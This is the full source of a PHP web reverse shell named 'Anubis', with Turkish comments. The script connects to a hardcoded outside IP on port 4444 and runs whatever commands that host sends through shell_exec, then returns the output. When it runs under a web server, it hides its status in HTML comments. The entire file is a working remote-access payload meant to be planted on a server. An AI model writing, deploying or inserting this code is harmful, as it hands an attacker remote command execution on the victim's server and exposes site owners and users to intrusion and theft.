<?php
// revernubis.php - Web Reverse Shell Client
// WireGuard IP ile güvenli bağlantı

// WireGuard IP'yi buraya yaz
$WG_IP = "89.39.107.172";  // Kali WireGuard IP
$PORT = 4444;

// Web'de çalışıyorsa output'u gizle
if (php_sapi_name() !== 'cli') {
    // Web'de çalışıyor
    echo "<!-- Web Reverse Shell Active -->";
} else {
    // CLI'de çalışıyor
    echo "==========================================\n";
    echo "    ANUBIS REVERSE SHELL\n";
    echo "==========================================\n";
    echo "[+] WireGuard IP: $WG_IP\n";
    echo "[+] Port: $PORT\n";
    echo "[+] Bağlantı kuruluyor...\n\n";
}

// Socket oluştur
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if (!$socket) {
    die("[-] Socket oluşturulamadı\n");
}

// Server'a bağlan
if (!socket_connect($socket, $WG_IP, $PORT)) {
    if (php_sapi_name() !== 'cli') {
        die("<!-- Connection Failed -->");
    } else {
        die("[-] Bağlantı kurulamadı: $WG_IP:$PORT\n");
    }
}

if (php_sapi_name() !== 'cli') {
    echo "<!-- Connected -->";
} else {
    echo "[+] Server'a bağlandı\n";
}

// Ana döngü
while (true) {
    // Server'dan komut al
    $command = socket_read($socket, 1024);
    
    if (!$command) {
        if (php_sapi_name() !== 'cli') {
            echo "<!-- Connection Lost -->";
        } else {
            echo "[-] Bağlantı kesildi\n";
        }
        break;
    }
    
    $command = trim($command);
    
    if (strtolower($command) == 'exit') {
        if (php_sapi_name() !== 'cli') {
            echo "<!-- Exit Command -->";
        } else {
            echo "[+] Çıkış komutu alındı\n";
        }
        break;
    }
    
    // Komutu çalıştır
    $output = shell_exec($command);
    
    if ($output === null) {
        $output = "[-] Komut çalıştırılamadı\n";
    }
    
    // Yanıtı gönder
    socket_write($socket, $output);
}

socket_close($socket);
if (php_sapi_name() !== 'cli') {
    echo "<!-- Connection Closed -->";
} else {
    echo "[+] Bağlantı kapatıldı\n";
}
?>
